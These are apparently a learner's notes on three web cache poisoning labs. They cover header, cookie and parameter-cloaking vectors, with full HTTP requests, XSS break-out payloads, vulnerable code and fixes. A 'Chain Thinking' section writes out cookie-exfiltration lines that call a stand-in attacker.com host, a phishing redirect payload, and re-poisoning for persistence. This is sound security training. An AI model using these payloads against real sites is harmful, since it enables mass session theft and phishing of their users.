# Day 38 Notes — Web Cache Poisoning

---

## 1. What We Did Today Overview

- Completed Lab 1: Web cache poisoning with an unkeyed header — used Param Miner to discover `X-Forwarded-Host`, hosted malicious `tracking.js` on the exploit server, poisoned the cache with a cache buster for safe testing, then removed the buster to affect all users
- Completed Lab 2: Web cache poisoning with an unkeyed cookie — used Param Miner to discover `fehost` cookie, confirmed reflection inside a JavaScript object literal, crafted `"-alert(1)-"` payload to break out of the JS string context, poisoned the cache via cookie header
- Completed Lab 3: Web cache poisoning via parameter cloaking — discovered `callback` JSONP parameter reflected into a JS file, used `;` to cloak a second `callback=alert(1)` inside the excluded `utm_content` parameter, poisoned the `/js/geolocate.js` endpoint
- Used Param Miner extension across all three labs for automated unkeyed input discovery

---

## 2. The Foundation — Why Web Cache Poisoning Exists

### Part A — Root Cause

Web caches sit between users and the origin server — storing response copies so future requests for the same resource are served instantly without hitting the origin. The cache decides what is "the same request" using a **cache key** — typically built from the URL path and a small set of headers like `Host`.

The problem: many things can influence the **content** of a response that are **not part of the cache key**. These are called **unkeyed inputs** — headers, cookies, or parameters that the application reads and reflects into the response, but that the cache ignores when deciding whether two requests match the same cache entry.

If an attacker sends a request with a malicious value in an unkeyed input, and the application reflects that value into the response, and the cache stores that response under a key that doesn't account for the malicious input — **every subsequent user requesting that same cache key receives the poisoned response.**

**The developer's mistake:** not auditing which inputs affect response content, and not ensuring the cache key includes all of them.

### Part B — Real World Analogy

A restaurant pre-makes sandwiches based on orders. The sandwich label records only the type — "BLT" or "Club" — not any special instructions on sticky notes attached to the order. A customer attaches a sticky note saying "add poison." The chef follows the note but labels the sandwich just "BLT." The next customer who orders a BLT gets the poisoned one from the shelf. The attacker never interacted with the victim directly — the poisoned item just sat there waiting.

### Part C — Three Conditions Required

1. The application sits behind a web cache (CDN, reverse proxy, or application-level cache)
2. An unkeyed header, cookie, or parameter influences the response content
3. The attacker can get their poisoned response stored in the cache under a key that future legitimate users will also request

### Part D — What Web Cache Poisoning Can and Cannot Do

**Can do:**
- Deliver XSS to every user requesting a cached URL — zero interaction with individual victims
- Redirect entire user bases to attacker-controlled sites
- Serve malicious JavaScript from a single crafted request that persists for the cache TTL
- Re-poison continuously to maintain the attack indefinitely

**Cannot do:**
- Work if the unkeyed input is actually included in the cache key
- Work if the application doesn't reflect the unkeyed input into the response
- Work if the response has `Cache-Control: no-store` — the cache won't store it at all

### Part E — Real World Context

Web cache poisoning was researched extensively by **James Kettle at PortSwigger in 2018** — he found cache poisoning on dozens of major websites including US government sites. A single poisoned request on a high-traffic page can affect **millions of users**. HackerOne payouts range from **$500 to $5,000+** depending on traffic volume and payload severity.

### Part F — Three Vectors Covered Today

| Vector | What the Cache Misses | Lab |
|---|---|---|
| Unkeyed header | `X-Forwarded-Host` not in cache key | Lab 1 |
| Unkeyed cookie | `fehost` cookie not in cache key | Lab 2 |
| Parameter cloaking | `;`-separated param hidden inside excluded `utm_content` | Lab 3 |

---

## 3. How to Read Cache Headers (Use in Every Lab)

Before diving into labs — these are the signals that tell you whether a response was cached:

| Header | What It Means |
|---|---|
| `X-Cache: hit` | Response was served from cache — not from the origin server |
| `X-Cache: miss` | Cache had no stored entry — went to origin, may now store the response |
| `Age: 19` | Response has been sitting in cache for 19 seconds |
| `Cache-Control: max-age=30` | Response is cacheable for 30 seconds |
| `Cache-Control: no-store` | Cache must NOT store this response — poisoning impossible |

**Cache buster technique:** Add a unique query parameter while testing so you don't poison the real URL during experimentation:

```
GET /?cb=aniz0412
```

Change `aniz0412` to a fresh value for each test. This creates an isolated cache entry. Only remove the buster when the payload is confirmed and you're ready to poison the real path.

---

## 4. Lab 1 — Web Cache Poisoning with an Unkeyed Header

### Lab Name
Web cache poisoning with an unkeyed header

### Vector
`X-Forwarded-Host` header reflected into response as a script `src`, not included in the cache key

### Step 1 — Discovering the Unkeyed Header with Param Miner

Param Miner is a Burp extension that automatically discovers hidden or unkeyed inputs by injecting canary values into headers and parameters and checking if they appear in responses.

**How Param Miner works for header discovery:**
1. Right-click any request in Burp → Extensions → Param Miner → **Guess headers**
2. Param Miner sends the request dozens of times with different injected headers
3. When it finds a header whose value appears in the response — it flags it

**What Param Miner found:** `X-Forwarded-Host` — the value injected into this header appeared in the response body, confirming it is unkeyed and reflected.

### Step 2 — Confirming Reflection with Cache Buster

**Exact request sent (testing phase):**

```http
GET /?cb=aniz0412 HTTP/2
Host: 0ad8005104578c138040032300e800f2.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Forwarded-Host: exploit-0a7200b604368ca580fe02c1019d00c2.exploit-server.net
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Why `/?cb=aniz0412`:** The cache key includes the query string. `?cb=aniz0412` is a unique, never-before-requested URL — so any response the cache stores for this URL only affects this specific test entry, not the real homepage. Real users visiting `/` are not affected during testing.

**Why the exploit server URL in `X-Forwarded-Host`:** The application uses `X-Forwarded-Host` to build the `src` attribute of a `<script>` tag. By pointing it at the exploit server, the application generates a `<script src="//exploit-server.net/...">` tag — making the page load JavaScript from a server the attacker controls.

**What appeared in the response:**

```html
<script type="text/javascript" src="//exploit-0a7200b604368ca580fe02c1019d00c2.exploit-server.net/resources/js/tracking.js">
```

**Confirmed:** The `X-Forwarded-Host` value is reflected verbatim into a `<script src>` attribute with no encoding — an attacker-controlled URL is embedded into the page's HTML.

### Step 3 — Setting Up the Exploit Server Payload

On the exploit server:
- Changed the file path from `/exploit` to `/resources/js/tracking.js` — to match exactly what the poisoned `<script src>` tag requests
- Set the response body to:

```javascript
alert(document.cookie);
```

**Why this path matters:** The application generates `<script src="//exploit-server.net/resources/js/tracking.js">`. When a victim's browser loads the poisoned page, it makes a GET request for that exact path. If the exploit server serves a different path — the browser gets a 404 and no XSS fires. The path must match exactly.

**Why `alert(document.cookie)` not just `alert(1)`:** `document.cookie` proves real impact — it shows the victim's session cookie would be exfiltrated in a real attack. `alert(1)` only proves execution.

### Step 4 — Confirming XSS Fires with Cache Buster

Sent the poisoned request with `/?cb=aniz0412` to Burp Repeater → clicked Send → the response contained the exploit server URL in the script tag. Waited for the cache to store the response (confirmed by `X-Cache: hit` on a second send) → then loaded `/?cb=aniz0412` in the browser → `alert(document.cookie)` fired.

**This confirmed:** The payload works, the cache is storing it, and the exploit server is serving the malicious JS correctly — all without affecting real users.

### Step 5 — Removing the Cache Buster to Poison Real Users

**Final poisoning request:**

```http
GET / HTTP/2
Host: 0ad8005104578c138040032300e800f2.web-security-academy.net
X-Forwarded-Host: exploit-0a7200b604368ca580fe02c1019d00c2.exploit-server.net
```

Sent from Repeater — waited for `X-Cache: hit` — confirming the poisoned response was now stored under the cache key for `/`.

Any user visiting the homepage received the cached response containing:

```html
<script type="text/javascript" src="//exploit-0a7200b604368ca580fe02c1019d00c2.exploit-server.net/resources/js/tracking.js">
```

Their browser loaded `alert(document.cookie)` from the exploit server — lab solved.

### Why It Worked — The Cache vs Origin Mismatch

**What the origin server does:**
Reads `X-Forwarded-Host` → uses it to build the `<script src>` URL → attacker's value embedded in HTML.

**What the cache does:**
Stores the response under the key built from `Host` + path only → `X-Forwarded-Host` is never part of the key → two requests with completely different `X-Forwarded-Host` values map to the same cache entry.

**The mismatch:** The cache thinks "all requests to `/` are equivalent." The origin thinks "the response depends on `X-Forwarded-Host`." The cache is wrong — and stores a poisoned response that gets served to everyone.

---

## 5. Lab 2 — Web Cache Poisoning with an Unkeyed Cookie

### Lab Name
Web cache poisoning with an unkeyed cookie

### Vector
`fehost` cookie reflected inside a JavaScript object literal in the page — cookie not included in the cache key

### Step 1 — Discovering the Unkeyed Cookie with Param Miner

**Param Miner output (verbatim):**

```
Initiating cookie bruteforce on 0a0a00f903956438805812bf00200082.web-security-academy.net
Identified parameter on 0a0a00f903956438805812bf00200082.web-security-academy.net: fehost
Found issue: Web Cache Poisoning: Query param blacklist
Target: https://0a0a00f903956438805812bf00200082.web-security-academy.net
The application excludes certain parameters from the cache key. This was confirmed by
injecting the value 'akzldka' using the z9ymfjm470 parameter, then replaying the request
without the injected value, and confirming it still appears in the response.
```

**What this tells us:**
- `fehost` is a cookie whose value appears in the response
- The cache does not include it in the cache key
- Param Miner confirmed this by injecting a canary value (`akzldka`) via `fehost`, then replaying the request **without** that cookie — and still receiving `akzldka` in the response (served from the poisoned cache)

### Step 2 — Confirming Reflection and Understanding the Context

**Testing request sent:**

```http
GET /?cb=aniz0412 HTTP/2
Host: 0a0a00f903956438805812bf00200082.web-security-academy.net
Cookie: session=g0jTI8esfZLhseoWVlDXARA0WEBDjU3u; fehost=prod-cache-02
```

**Exact response received (verbatim — relevant section):**

```javascript
data = {"host":"0a0a00f903956438805812bf00200082.web-security-academy.net","path":"/","frontend":"prod-cache-02"}
```

**What this shows:** The `fehost` cookie value (`prod-cache-02`) is reflected directly inside a JavaScript object literal as the value of the `frontend` key. It is embedded inside a `"` (double-quoted) JavaScript string — no encoding applied.

**Identifying the injection context:**

The value lands here:

```javascript
data = {"host":"...","path":"/","frontend":"FEHOST_VALUE_HERE"}
```

This is a **JavaScript string context inside a JSON-like object literal**. To execute code, the payload must:
1. Close the opening `"` of the string — using `"`
2. Execute arbitrary JS — using `-alert(1)-`
3. The trailing `-"` re-opens a string — the subtraction operator evaluates both sides, forcing `alert(1)` to execute, while maintaining syntactic validity so the browser doesn't throw a parse error on the rest of the script

### Step 3 — Confirming Via Browser Console

Inspected the page in the browser developer tools → Console tab → typed:

```javascript
data={"frontend":"" - alert() - "" }
```

Alert fired — confirming the `"` + arithmetic operator break-out works in this JS context.

**Why `-` (subtraction) works as a break-out operator:**

The full injected expression becomes:

```javascript
data = {"host":"...","path":"/","frontend":""-alert(1)-""}
```

JavaScript evaluates this as:
- `""` — empty string
- `-` — subtraction operator — forces type coercion — JavaScript tries to evaluate both sides as numbers
- `alert(1)` — function call executes — `alert()` returns `undefined`
- `undefined` is coerced to `NaN` — subtraction result is `NaN` — assigned to `data.frontend`
- No syntax error — the rest of the script continues normally

**The key insight:** The `-` operator forces expression evaluation. `alert(1)` is called as part of the arithmetic expression even though it's inside what looks like a string literal — because the `"` closed the string first.

### Step 4 — Crafting and Sending the Poisoning Request

**Final poisoning request:**

```http
GET / HTTP/2
Host: 0a0a00f903956438805812bf00200082.web-security-academy.net
Cookie: session=g0jTI8esfZLhseoWVlDXARA0WEBDjU3u; fehost="-alert(1)-"
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Exact response received (verbatim — relevant section):**

```javascript
<script>
    data = {"host":"0a0a00f903956438805812bf00200082.web-security-academy.net","path":"/","frontend":""-alert(1)-""}
</script>
```

**Cache headers observed:**

```
Cache-Control: max-age=30
Age: 19
X-Cache: hit
```

- `max-age=30` — cacheable for 30 seconds
- `Age: 19` — this response has been cached for 19 seconds already
- `X-Cache: hit` — confirmed served from cache

**What happened:** The poisoned response (containing the `alert(1)` break-out in the `frontend` field) was stored in the cache under the key for `/`. Any visitor requesting `/` within the 30-second TTL received this response — and their browser executed `alert(1)` when parsing the inline script — lab solved.

### Why Cookies Being "Personal" Doesn't Protect Against This

Cookies are normally considered session-specific — each user has their own. But the cache treats the response as public/shared (no `Vary: Cookie` header in the cache config) — it doesn't know that `fehost` affects the response content. So one attacker's cookie value gets baked into a response that the cache then shares with users who have no cookies at all.

---

## 6. Lab 3 — Web Cache Poisoning via Parameter Cloaking

### Lab Name
Web cache poisoning via parameter cloaking

### Vector
`callback` JSONP parameter reflected into a JavaScript file — cloaked inside the excluded `utm_content` parameter using `;` as a separator that the origin recognises but the cache does not

### What Parameter Cloaking Is

This is fundamentally different from Labs 1 and 2. Nothing was "forgotten" by the cache. Instead, the cache and the origin server **disagree about what a parameter even is** — specifically, which character separates parameters.

- The **cache** splits query strings on `&` only — standard URL spec
- The **origin** (certain frameworks) also splits on `;` — a legacy convention

Given the query string `?utm_content=foo;callback=alert(1)`:

- The **cache** sees ONE parameter: `utm_content` with value `foo;callback=alert(1)` — recognises the `utm_` prefix → excludes the entire thing from the cache key
- The **origin** sees TWO parameters: `utm_content=foo` AND `callback=alert(1)` — processes both

The attacker's `callback` parameter is "cloaked" inside what the cache thinks is just the value of the excluded `utm_content` parameter.

### Step 1 — Understanding the Endpoint

The target endpoint is `/js/geolocate.js` — a JSONP endpoint. JSONP (JSON with Padding) is a legacy technique for cross-domain data loading. The endpoint accepts a `callback` parameter and wraps its JSON response in a function call:

```javascript
// Normal request: GET /js/geolocate.js?callback=setCountryCookie
// Response:
setCountryCookie({"country":"United Kingdom"});
```

The `callback` parameter value is reflected verbatim into the JavaScript response — not into HTML. This means standard HTML XSS payloads won't work — but since it's reflected into JavaScript without validation, any valid JavaScript function name (or payload that looks like one) works.

### Step 2 — Crafting the Cloaked Payload

**Final poisoning request:**

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/2
Host: 0a8000040338f26385cdcb4e006900e8.web-security-academy.net
Cookie: country=[object Object]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Breaking down the query string:**

```
?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

**`callback=setCountryCookie`** — the first, legitimate `callback` parameter. This is what the origin server would normally use. But because the origin also parses `;`-separated params — and because when a parameter appears twice, many frameworks use the **last occurrence** — the second `callback=alert(1)` (cloaked after `;`) overrides the first.

**`&utm_content=foo;callback=alert(1)`** — this is the cloaking payload:
- The cache splits on `&` → sees `utm_content` = `foo;callback=alert(1)` → recognises `utm_` prefix → **excludes entire thing from cache key**
- The origin splits on `;` within the value → extracts a second parameter: `callback=alert(1)` → this overrides the first `callback=setCountryCookie`

**The cache key the cache computes:**
`/js/geolocate.js?callback=setCountryCookie` — the `utm_content` parameter and everything cloaked inside it is stripped.

**The parameters the origin actually processes:**
`callback=setCountryCookie` AND `callback=alert(1)` (from `;` splitting) → last-occurrence wins → `callback=alert(1)`

### Step 3 — Exact Response Received

```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Set-Cookie: session=6rslBnCDkeYRH6isTcnqpBn5aAaX6brE; Secure; HttpOnly; SameSite=None
Set-Cookie: utm_content=foo; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 193

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

**Analysing the response line by line:**

**`Set-Cookie: utm_content=foo`** — the server extracted `utm_content=foo` from the `;`-split and set it as a cookie, confirming the origin is parsing `;`-separated parameters.

**`Cache-Control: max-age=35`** — the response is cacheable for 35 seconds.

**`Age: 0` + `X-Cache: miss`** — this was the first request for this cache entry — a cache miss. The response is now being stored.

**`alert(1)({"country":"United Kingdom"});`** — the callback was overridden to `alert(1)`. The JSONP response became `alert(1)({"country":"United Kingdom"})` — calling `alert(1)` as a function with the JSON object as its argument. `alert(1)` fires first (showing `1`), then JavaScript tries to call its return value (`undefined`) as a function with the JSON object — which throws a TypeError, but the alert already fired.

**What the cache stored under the key `/js/geolocate.js?callback=setCountryCookie`:**

```javascript
alert(1)({"country":"United Kingdom"});
```

Any request for `/js/geolocate.js?callback=setCountryCookie` — including the legitimate one made by every page that loads the geolocation script — now receives this poisoned response.

### Why This Is the Most Dangerous Variant

The poisoned URL `/js/geolocate.js?callback=setCountryCookie` is the **canonical, legitimate URL** that the application itself generates. No attacker-crafted URL needs to be shared — any user whose browser loads the homepage (which loads this script via a normal `<script src>` tag) will trigger the XSS. The attack is invisible in the URL bar.

---

## 7. Vulnerable Source Code — Line by Line

### Pattern 1 — Unkeyed Header (Lab 1)

**Cache configuration:**

```nginx
# Cache key — X-Forwarded-Host is NOT included
proxy_cache_key "$scheme$request_method$host$request_uri";
proxy_cache_valid 200 30s;
```

**Application code:**

```javascript
// Vulnerable — trusts X-Forwarded-Host for building script URLs
const host = req.headers['x-forwarded-host'] || req.headers['host'];
res.send(`
    <script type="text/javascript"
        src="//${host}/resources/js/tracking.js">
    </script>
`);
```

**`proxy_cache_key` without `X-Forwarded-Host`:** The cache never sees this header. Two requests — one with `X-Forwarded-Host: legitimate.com` and one with `X-Forwarded-Host: attacker.com` — are treated as identical cache entries.

**`req.headers['x-forwarded-host'] || req.headers['host']`:** Prioritises the attacker-controlled header. No validation of what the value contains — it goes directly into an HTML attribute.

**`src="//${host}/..."`:** Template literal embeds the unvalidated header value into a `script src` attribute. The `//` prefix means "protocol-relative" — the browser uses whatever protocol (HTTP or HTTPS) the page is loaded over.

---

### Pattern 2 — Unkeyed Cookie (Lab 2)

**Cache configuration:**

```nginx
# Cache does not vary on Cookie header — cookies excluded from key
proxy_cache_key "$scheme$request_method$host$request_uri";
proxy_ignore_headers Set-Cookie;
```

**Application code:**

```javascript
// Vulnerable — fehost cookie value embedded into inline JS object
const feHost = req.cookies['fehost'] || 'prod-cache-01';
res.send(`
    <script>
        data = {
            "host": "${req.headers.host}",
            "path": "${req.path}",
            "frontend": "${feHost}"
        }
    </script>
`);
```

**`proxy_ignore_headers Set-Cookie`:** The cache ignores cookies entirely when building the cache key. A response whose content varies by cookie gets cached as if cookies don't exist.

**`const feHost = req.cookies['fehost']`:** Reads the cookie — fully attacker-controlled. No sanitisation.

**`"frontend": "${feHost}"`:** Template literal directly embeds the cookie value inside a JS string literal in an inline script. No HTML encoding, no JS string escaping. A `"` in the value breaks out of the string.

---

### Pattern 3 — Parameter Cloaking (Lab 3)

**Cache normalisation logic:**

```python
# Cache strips utm_* params from cache key — splits on & only
def build_cache_key(query_string):
    params = query_string.split('&')
    kept = [p for p in params if not p.startswith('utm_')]
    return '&'.join(sorted(kept))

# Input:  callback=setCountryCookie&utm_content=foo;callback=alert(1)
# Output: callback=setCountryCookie
# (utm_content and everything cloaked inside it is dropped)
```

**Origin application (Rack/Ruby — splits on both & and ;):**

```ruby
# Rack historically parses both & and ; as separators
params = Rack::Utils.parse_query(request.query_string)
# Input:  callback=setCountryCookie&utm_content=foo;callback=alert(1)
# Output: {"callback" => "alert(1)", "utm_content" => "foo"}
# Last occurrence of callback wins — alert(1)

callback = params['callback'] || 'defaultCallback'
# Reflected directly into JS response — no validation
response.body = "#{callback}(#{json_data});"
# Produces: alert(1)({"country":"United Kingdom"});
```

**`Rack::Utils.parse_query` splits on `;`:** This is the root of the discrepancy. The origin's query parser treats `;` as equivalent to `&`. The cache's parser does not.

**Last-occurrence wins for duplicate keys:** Both `callback=setCountryCookie` (from `&`) and `callback=alert(1)` (from `;`) are parsed. The origin uses the last value — `alert(1)`.

**`"#{callback}(#{json_data});"` with no validation:** The callback value is reflected directly into JavaScript with no sanitisation — any valid JS expression works as a callback name.

---

## 8. What Failed and Why

Nothing failed today. All three labs were solved without hints.

**Observation from Lab 1 — exploit server path must match exactly:**
The application generates `<script src="//exploit-server.net/resources/js/tracking.js">`. The exploit server must serve content at `/resources/js/tracking.js` — not `/exploit` or any other path. The browser requests the exact path in the `src` attribute — a 404 means no XSS.

**Observation from Lab 2 — `-alert(1)-` vs `<script>alert(1)</script>`:**
Standard HTML injection does not work here because the payload lands inside an existing `<script>` block — not in HTML. The break-out technique uses the `-` arithmetic operator to force expression evaluation while maintaining syntactic validity for the rest of the script.

**Observation from Lab 3 — `alert(1)({"country":"United Kingdom"})` syntax:**
The poisoned response calls `alert(1)` as a function, then tries to call its return value (`undefined`) as a function with the JSON data — which throws a TypeError. But this happens after `alert(1)` already fired. The TypeError doesn't prevent the XSS.

---

## 9. Chain Thinking

### Chain 1 — Unkeyed Header → Cached XSS → Mass Session Hijacking

```
X-Forwarded-Host identified as unkeyed via Param Miner
        ↓
Exploit server hosts:
/resources/js/tracking.js → fetch('https://attacker.com/?c='+document.cookie)
        ↓
Poisoning request sent — no cache buster — Cache-Control: max-age=30
        ↓
Every visitor to homepage within 30-second window
receives poisoned response containing script src pointing to exploit server
        ↓
Browser loads fetch() payload from exploit server
Victim's document.cookie sent to attacker
        ↓
Attacker re-sends poisoning request every 25 seconds
Cache permanently poisoned — attack persists indefinitely
        ↓
Mass session cookie harvesting — scale = all homepage traffic
```

### Chain 2 — Unkeyed Cookie → Cached Redirect → Mass Phishing

```
fehost cookie identified as unkeyed via Param Miner
        ↓
Payload: fehost="-(window.location="https://attacker-phish.com")-"
        ↓
Poisoned response cached under / — max-age=30
        ↓
Every visitor to homepage is redirected to attacker's phishing site
        ↓
Phishing site clones the login page
Victim enters credentials → attacker captures them
        ↓
Re-poison every 25 seconds → persistent mass phishing
```

### Chain 3 — Parameter Cloaking → Invisible Poisoning of Canonical JS File

```
JSONP endpoint /js/geolocate.js?callback=setCountryCookie
loaded by every page on the site via <script src>
        ↓
Parameter cloaking payload:
?callback=setCountryCookie&utm_content=foo;callback=fetch('//attacker.com/?c='+document.cookie)
        ↓
Cache stores poisoned response under:
/js/geolocate.js?callback=setCountryCookie
(the canonical legitimate URL)
        ↓
EVERY page that loads this script now exfiltrates cookies
Victim never needs to visit any special URL
Attack affects the entire site via its own legitimate resource loading
        ↓
Hardest to detect — no unusual URL in browser history
        ↓
Re-poison every 35 seconds to maintain persistence
```

### Severity Table

| Finding | Severity | Reason |
|---|---|---|
| Unkeyed input found, no reflection | Low | Confirmed but no impact |
| Unkeyed input reflected, not exploitable context | Medium | Information disclosure possible |
| Unkeyed header/cookie + XSS, cached | Critical | Affects all users during cache window |
| Parameter cloaking + XSS on canonical URL | Critical+ | No visible attack indicator — highest stealth |

---

## 10. Real World Context

**James Kettle's 2018 research — "Practical Web Cache Poisoning":** Found cache poisoning on major sites including the US DoD, Cloudflare's own site, and multiple Fortune 500 companies. The `X-Forwarded-Host` vector from Lab 1 was one of the original findings.

**CDN misconfiguration as the real-world cause:** Many cache poisoning vulnerabilities exist because CDN operators (Cloudflare, Fastly, Akamai) and application developers configure their systems independently without coordinating which inputs affect response content. The CDN team optimises for cache hit rate — the application team adds features that read new headers. Neither team audits the combined result.

**Why `utm_*` exclusion is a common real-world misconfiguration:** Marketing teams append UTM parameters to every link they share. If UTM params were in the cache key, every unique marketing link would be a separate cache entry — destroying cache effectiveness. So CDN teams exclude them. If the application server also happens to support `;`-separated parameters — parameter cloaking becomes possible.

**Bug bounty approach:**
1. Run Param Miner on every page — it finds unkeyed headers, cookies, and parameters automatically
2. For every unkeyed input found — check where its value appears in the response
3. Identify the context: HTML attribute, JS string, JS object, redirect URL, inline style
4. Craft a payload that matches the context
5. Use a cache buster to test safely
6. Confirm the cache stores the poisoned response (check `Age` header increases on resend)
7. Remove cache buster only when ready to demonstrate real impact
8. Report immediately — cache poisoning affects all users, not just the tester

---

## 11. The Fix

### Fix 1 — Never Trust Unkeyed Headers for Response Generation

```javascript
// VULNERABLE
const host = req.headers['x-forwarded-host'] || req.headers['host'];
res.send(`<script src="//${host}/tracking.js"></script>`);

// FIXED — hardcode the URL, never derive from headers
const STATIC_HOST = 'myapp.example.com';
res.send(`<script src="//${STATIC_HOST}/tracking.js"></script>`);

// OR — if dynamic host is required, include X-Forwarded-Host in cache key
// Nginx: proxy_cache_key "$scheme$request_method$host$request_uri$http_x_forwarded_host";
```

### Fix 2 — Include All Response-Affecting Inputs in the Cache Key

```nginx
# VULNERABLE — cookies excluded from cache key but affect response
proxy_cache_key "$scheme$request_method$host$request_uri";

# FIXED option 1 — include the specific cookie in the cache key
proxy_cache_key "$scheme$request_method$host$request_uri$cookie_fehost";

# FIXED option 2 — don't use cookie values in response generation
# Replace cookie-based config with server-side config only
```

### Fix 3 — Validate JSONP Callbacks and Normalise Query Parsing

```javascript
// VULNERABLE — callback reflected without validation
const callback = req.query.callback;
res.send(`${callback}(${JSON.stringify(data)})`);

// FIXED — whitelist valid callback names (alphanumeric and underscore only)
const callback = req.query.callback;
if (!/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(callback)) {
    return res.status(400).send('Invalid callback');
}
res.send(`${callback}(${JSON.stringify(data)})`);
```

```python
# FIXED — cache normalisation must use the same parser as the origin
# If origin splits on ; — cache key builder must also split on ;
def build_cache_key(query_string):
    # Split on both & and ; to match origin behaviour
    params = re.split(r'[&;]', query_string)
    kept = [p for p in params if not p.startswith('utm_')]
    return '&'.join(sorted(kept))
```

### Defense in Depth

1. **Run Param Miner on your own application** — find unkeyed inputs before attackers do
2. **Audit cache key configurations** — every input that affects response content must be in the cache key
3. **Use `Vary` response headers** — tell the cache explicitly which request headers affect the response: `Vary: X-Forwarded-Host`
4. **Set `Cache-Control: no-store` on personalised responses** — if a response varies by cookie or user session, it must not be cached at all
5. **Whitelist JSONP callbacks** — only allow alphanumeric function names via regex before reflection
6. **Normalise query string parsing between cache and origin** — use the same parser, or configure the CDN's normalisation to match the framework's actual behaviour

### What Does NOT Fix Cache Poisoning

- Input validation on the response side — the cache stores the response before the user validates it
- HTTPS — encryption does not affect what the cache stores or serves
- Session tokens — cache poisoning affects responses served to all users, not a specific session
- WAF blocking the payload in the request — the cache stores the response before the WAF's output filters apply (WAFs typically inspect requests, not cached response content)

---

## 12. Key Concepts Summary

| Term | Meaning |
|---|---|
| Cache key | The identifier the cache uses to match a stored response to a new request |
| Unkeyed input | A header, cookie, or parameter that affects the response but is not part of the cache key |
| Cache poisoning | Storing a malicious response in the cache so all future requests receive it |
| `X-Cache: hit` | Response was served from cache — not the origin |
| `X-Cache: miss` | No cached entry — request went to origin; response may now be stored |
| `Age` header | Seconds the response has been sitting in the cache |
| `Cache-Control: max-age=N` | Cache stores this response for N seconds |
| `Cache-Control: no-store` | Cache must never store this response |
| Cache buster | A unique query parameter added during testing to avoid poisoning the real URL |
| Param Miner | Burp extension that discovers unkeyed headers, cookies, and parameters automatically |
| JSONP | Legacy technique — wraps JSON in a JS function call — `callback({"key":"value"})` |
| Parameter cloaking | Hiding a parameter inside the value of an excluded parameter using `;` as a separator |
| `utm_*` exclusion | CDN optimization — strips marketing UTM parameters from cache keys |
| `;` as separator | Legacy URL convention — some frameworks treat `;` as equivalent to `&` for parameters |
| Protocol-relative URL | `//example.com/path` — uses the same protocol as the current page (HTTP or HTTPS) |
| `-alert(1)-` break-out | Uses arithmetic subtraction to force JS expression evaluation inside a string literal |

---

## 13. Payloads Reference

### Lab 1 — Unkeyed Header (X-Forwarded-Host)

```http
# Testing phase — with cache buster
GET /?cb=aniz0412 HTTP/2
Host: TARGET
X-Forwarded-Host: exploit-server.net

# Finding reflection in response
<script src="//exploit-server.net/resources/js/tracking.js">

# Exploit server payload at /resources/js/tracking.js
alert(document.cookie);

# Poisoning request — no cache buster
GET / HTTP/2
Host: TARGET
X-Forwarded-Host: exploit-server.net
```

### Lab 2 — Unkeyed Cookie (fehost)

```http
# Testing phase — confirm reflection
GET /?cb=aniz0412 HTTP/2
Cookie: session=SESSION; fehost=prod-cache-02
# Appears in response as: "frontend":"prod-cache-02"

# Testing JS break-out in browser console
data={"frontend":"" - alert() - "" }

# Poisoning request — no cache buster
GET / HTTP/2
Cookie: session=SESSION; fehost="-alert(1)-"

# Reflected in response as:
data = {"host":"...","path":"/","frontend":""-alert(1)-""}
```

### Lab 3 — Parameter Cloaking

```http
# Cloaking payload — hides callback=alert(1) inside utm_content
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/2

# Response (poisoned):
alert(1)({"country":"United Kingdom"});

# Cache key computed by cache:
/js/geolocate.js?callback=setCountryCookie
# (utm_content and everything after ; stripped as excluded param)

# Parameters parsed by origin:
callback = alert(1)   ← last occurrence wins
utm_content = foo
```

### General Cache Poisoning Testing Checklist

```
1. Run Param Miner → Guess headers + Guess params on the target page
2. For each unkeyed input found:
   a. Add cache buster: ?cb=UNIQUE_VALUE
   b. Inject test canary: header/cookie/param = test123
   c. Confirm test123 appears in response
   d. Identify context: HTML attr / JS string / JS object / redirect URL
   e. Craft appropriate payload for that context:
      - HTML attr break-out: "><script>alert(1)</script>
      - JS string break-out: "-alert(1)-"
      - Script src: data:,alert(1) or exploit server URL
      - JSONP callback: alert(1)
   f. Send with payload → confirm in response
   g. Send again → check Age header to confirm caching
   h. Remove cache buster → send final poisoning request
   i. Verify in incognito tab with no custom headers/cookies
3. Report with: unkeyed input name, reflection context, payload, cache TTL, impact
```

---

## 14. Foundation Checklist

1. **What is a cache key and what does it mean for an input to be "unkeyed"?**
   A cache key is the identifier the cache uses to decide whether a new request matches a stored response. It is typically built from the URL path and `Host` header. An unkeyed input is anything that affects the response content but is not included in the cache key — meaning the cache cannot tell apart two requests that differ only in that input, and will serve the same stored response to both regardless of the difference.

